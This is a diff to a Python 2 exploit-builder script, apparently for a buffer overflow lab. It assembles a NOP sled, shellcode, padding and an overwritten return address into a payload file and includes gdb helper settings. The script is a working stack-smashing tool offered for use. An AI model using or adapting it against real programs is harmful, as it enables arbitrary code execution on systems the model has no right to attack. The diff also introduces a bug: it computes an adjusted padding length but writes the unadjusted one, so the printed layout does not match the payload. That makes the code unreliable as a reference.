@@ -9,7 +9,9 @@ import os
 # prog clean
 
 
-
+"""
+Set your exploit/ debug variables here 
+"""
 # make sure your .gdbint has "run < sploit" in it
 gdb	="/usr/bin/gdb"
 
@@ -27,6 +29,12 @@ nops	= nop * 8
 # Set this to somewhere in the middle of your nops on the stack
 pcPivot = ######
 
+# If we need overflow set it here
+# format is decimal in bytes
+overflowPadding = 78
+
+# Wrapper to run bash commands and print out
+# errors/output
 def runCmd(cmd):
 	process = Popen(cmd, stdout=PIPE)
 	output, error = process.communicate()
@@ -73,12 +81,15 @@ with open(fName + ".bin",'rb') as f:
 # calc/add overflow
 overflow = ""
 if (len(sys.argv) > 2 and sys.argv[2].isdigit()):
-	overflowPadding = int(sys.argv[2]) - len(nops) - len(shellCode) - len(pcPivot)
-	print "{} nops len".format(len(nops))
-	print "{} shellcode len".format(len(shellCode))
-	print "{} pc overwrite len (this should always be 4)".format(len(pcPivot))
-	print "constructing exploit: nops + shellcode + A * {} + pcPivot".format(overflowPadding)
-	overflow = "A" * overflowPadding
+	overflowPadding = int(sys.argv[2])
+
+overflowAdjusted =  overflowPadding - len(nops) - len(shellCode) - len(pcPivot)
+
+print "{} nops len".format(len(nops))
+print "{} shellcode len".format(len(shellCode))
+print "{} pc overwrite len (this should always be 4)".format(len(pcPivot))
+print "constructing exploit: nops + shellcode + A * {} + pcPivot".format(overflowAdjusted)
+overflow = "A" * overflowPadding
 
 with open(exploit, 'wb') as f:
 	f.write(nops + shellCode + overflow + pcPivot )
